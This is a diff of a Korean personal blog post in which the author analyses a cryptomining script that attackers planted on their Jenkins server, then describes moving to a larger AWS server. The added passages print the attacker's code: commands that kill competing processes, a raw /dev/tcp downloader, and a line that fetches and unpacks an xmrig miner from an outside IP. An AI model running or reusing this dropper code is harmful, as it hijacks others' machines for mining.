@@ -98,6 +98,47 @@ k auto.c3pool.org:13333
  이 사람 고수다. 봐도 모르겠다. Linux 명령어들이라 더 모르겠다. 하지만 화가 나니 천천히 파헤쳐보자.
 
 ```bash
+ps aux | grep -v grep | grep -v "java\|redis\|weblogic\|mongod\|mysql\|oracle\|b52e75408\|tomcat\|grep\|postgres\|confluence\|awk\|aux\|sh"| awk "{if($3>60.0) print $2}" | xargs -I % kill -9 %
+
+if [[ $(whoami) != "root" ]]; then
+    for tr in $(ps -U $(whoami) | egrep -v "java|ps|sh|egrep|grep|PID" | cut -b1-6); do
+        kill -9 $tr || : ;
+    done;
+fi
+
+threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
+hostHash=$(hostname -f | md5sum | cut -c1-8);
+echo "${hostHash} - ${threadCount}";
+```
+
+ 아는 명령어를 보면 ps, grep, kill, echo 등이 있다. 일단 서버 최적화를 위해 흔히 많이들 쓰는 java나 데이터베이스 등의 프로세스를 끝내놓으려는 것 같다. 그리고 if 아래부분은 서버 스펙을 확인하는 부분이다.
+
+```bash
+_curl () {
+  read proto server path <<<$(echo ${1//// })
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+
+  exec 3<>/dev/tcp/${HOST}/$PORT
+  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+  (while read line; do
+   [[ "$line" == $'\r' ]] && break
+  done && cat) <&3
+  exec 3>&-
+}
+
+rm -rf config.json;
+
+d () {
+      curl -L --insecure --connect-timeout 5 --max-time 40 --fail $1 -o $2 2> /dev/null || wget --no-check-certificate --timeout 40 --tries 1 $1 -O $2 2> /dev/null || _curl $1 > $2;
+}
+```
+
+ d()라는 함수는 더 아래부분에서 쓰이는데 파일 다운로드를 위한 함수이다. 보면 curl, wget, 자체적으로 만든 _curl() 함수를 통해 다양한 방법으로 파일을 다운받으려는 것을 볼 수 있다. _curl()은 다는 이해 못하겠는데 echo 부분을 보니 아마 직접 Http protocol에 맞춰 수기작성해 보내는 것 같다.
+
+```bash
 test ! -s trace && \
     d http://118.189.172.141:8080/novoCRM/static/xmrig-6.4.0-linux-x64.tar.gz trace.tgz && \
     tar -zxvf trace.tgz && \
@@ -108,7 +149,13 @@ test ! -s trace && \
 test ! -x trace && chmod +x trace;
 ```
 
- 위의 내용을 이해 못해도 이 부분만 보면 해킹범의 의도를 알 수 있다. <code>xmrig</code>때문인데, 구글링을 해보면 암호화폐 채굴 오픈소스 소프트웨어라고 한다. 그렇다.. 내 서버를 채굴장으로 쓰려고 했던 것이다. 이 스크립트를 crontab(* * * * *)로 설정하여 매 분마다 실행하였다. 하지만 해킹범은 의외로 순진했다. 내 서버는 너무 구져서 웬만한 작업은 돌아가지 않는다는 것이었다.
+ 위의 내용을 이해 못해도 이 부분만 보면 해킹범의 의도를 알 수 있다. <code>xmrig</code>때문인데, 구글링을 해보면 암호화폐 채굴 오픈소스 소프트웨어라고 한다. 정리하자면 
+ 
+ 1. 자신의 서버에 있는 소프트웨어 압축 파일을 trace.tgz이름으로 다운로드 받고
+ 2. 압축해제한 후 권한을 주고
+ 3. k() 함수를 통해 소프트웨어를 실행하는 것이다
+   
+   그렇다... 이 녀석은 내 서버를 채굴장으로 쓰려고 했던 것이다. 이 스크립트를 crontab(* * * * *)로 설정하여 매 분마다 실행하였다. 하지만 해킹범은 조금 안일했다. 내 서버는 너무 구져서 웬만한 작업은 돌아가지 않는다는 것이었다.
 
   ![img5](/assets/img/2025-02-24-jenkins-hacking/img5.png)
 
@@ -124,4 +171,4 @@ test ! -x trace && chmod +x trace;
 
  난 이 서버가 저주받았다고 생각하기로 했다. 성능도 개구진데(같은 스펙의 AWS 서버는 이정도는 아닌데 잘못 뽑혔나도 싶다) 해킹도 두번 당해서 터가 망했다. 그래서 서버를 옮기기로 했다. 어떻게 vcpu 1개, RAM 1GB 서버를 살려보겠다고 기본적인 스왑 메모리부터 배치 어플리케이션내의 성능 최적화나 비동기 프레임워크 webflux 이런 것도 기웃거려봤지만 사실 알고있다... 스케일업이 제일 편한 방법이라는 것을... 더 쓰다간 머리빠질 것 같다.
 
-  그래서 백수인 주제에 큰 맘먹고 AWS Lightsail의 vcpu 2개, RAM 2GB 서버를 샀다. 내 머리털을 위해서라면 한달 12달러? 충분히 줄 수 있다. Docker와 볼륨걸어놓은 Jenkins 폴더를 통째로 압축해서 옮긴 후 새로운 서버에 볼륨을 걸어주니 예전 그대로 실행됐다(여전히 로그인창은 없다). 큰 스펙업은 아니지만 요새 눈에 띄게 머리가 맑아진 것 같다. 배치를 돌리면서도 페이지에 들어가지고 모니터링 에이전트들도 잘 동작한다. 조만간 데이터베이스 서버도 그냥 AWS RDS Freetier로 옮길까 생각하고 있다. 데이터베이스 서버도 역시 너무 느리고 계속 "Communication Link Failure" 오류가 뜨는데 커넥션 시간 늘리고 뭐해도 안되고 가끔 데이터베이스 드라이버를 못읽어온다드니 꿹딻끿뭻! 계속 배치가 멈추는 일이 발생해 여기도 스트레스가 장난아니다. 스펙은 똑같지만 혹시 옮기면 괜찮나도 싶고 그래도 안되면 데이터베이스 서버도 스펙업시킬 생각이다.  
+  그래서 백수인 주제에 큰 맘먹고 AWS Lightsail의 vcpu 2개, RAM 2GB 서버를 샀다. 내 머리털을 위해서라면 한달 12달러? 충분히 줄 수 있다. Docker와 볼륨걸어놓은 Jenkins 폴더를 통째로 압축해서 옮긴 후 새로운 서버에 볼륨을 걸어주니 예전 그대로 실행됐다(여전히 로그인창은 없다). 큰 스펙업은 아니지만 요새 눈에 띄게 머리가 맑아진 것 같다. 배치를 돌리면서도 페이지에 들어가지고 모니터링 에이전트들도 잘 동작한다. 조만간 데이터베이스 서버도 그냥 AWS RDS Freetier로 옮길까 생각하고 있다. 데이터베이스 서버도 역시 너무 느리고 계속 "Communication Link Failure" 오류가 떠서 배치가 끝나는 경우가 있는데 커넥션 시간 늘리고 뭐해도 안되고 또 가끔 데이터베이스 드라이버를 못읽어온다드니 꿹딻끿뭻! 계속 배치가 멈추는 일이 발생해 여기도 스트레스가 장난아니다. 스펙은 똑같지만 혹시 옮기면 괜찮나도 싶고 그래도 안되면 데이터베이스 서버도 스펙업시킬 생각이다.  
